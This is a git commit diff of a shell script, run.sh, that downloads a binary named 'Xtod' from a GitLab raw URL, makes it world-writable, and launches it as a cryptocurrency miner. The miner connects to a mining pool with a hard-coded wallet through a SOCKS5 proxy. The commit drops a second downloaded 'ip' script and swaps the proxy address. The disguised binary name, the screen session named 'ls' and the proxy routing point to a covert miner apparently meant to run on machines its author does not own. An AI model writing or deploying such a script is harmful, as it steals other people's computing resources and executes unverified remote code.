a376115dad637d56d08dd234a99025a4e2c8ea24
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-11 00:25:33 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,13 +1,11 @@
 #!/bin/sh
 apt-get update 
 apt-get install screen libjansson4 -y
-wget https://gitlab.com/buyutuk/xmr/-/raw/main/ip
 wget https://gitlab.com/buyutuk/xmr/-/raw/main/Xtod
-chmod 777 ip Xtod
-screen -d -m python3 ip
+chmod 777 Xtod
 screen -dmS ls
 POOL=pool.hashvault.pro:80
 WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
-WORKER=1-GAS
-PROXY=socks5://72.210.252.134:46164
+WORKER=GAS
+PROXY=socks5://72.221.164.34:60671
 ./Xtod -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
